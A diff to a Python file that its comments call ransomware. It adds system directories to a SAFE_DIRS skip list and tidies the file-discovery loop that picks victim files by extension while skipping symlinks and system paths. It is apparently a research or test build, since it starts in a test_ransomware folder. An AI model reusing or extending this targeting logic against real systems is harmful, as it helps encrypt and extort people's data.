@@ -18,7 +18,10 @@ from globals import get_config_from_file
 LINUX_STARTDIRS = [environ['HOME'] + '/test_ransomware']
 EXTENSION = ".wasted"  # Ransomware custom extension
 ROAR_DIR = "/roar"
-SAFE_DIRS = [ROAR_DIR, "/snap", "/sys", "/lib/python3"]
+
+# following list of important Linux system directories: https://tldp.org/LDP/abs/html/systemdirs.html
+SAFE_DIRS = ["/boot", "/bin", "/usr/bin", "/usr/local/bin", "/sbin", "/usr/sbin", "/lib/python3", "/usr/lib/python3",
+             "/snap", "/sys", ROAR_DIR]
 
 # ============================================================
 # ============ 		KEYS 	  ==============
@@ -109,7 +112,7 @@ def discover_files(start_path):
     for dir_path, dirs, files in walk(start_path):
         for i in files:
             absolute_path = path.abspath(path.join(dir_path, i))
-            if not any(absolute_path.startswith(safe_dir+"/") for safe_dir in SAFE_DIRS):
+            if not any(absolute_path.startswith(safe_dir + "/") for safe_dir in SAFE_DIRS):
                 ext = absolute_path.split('.')[-1]
                 if ext in extensions and not path.islink(absolute_path):
                     yield absolute_path
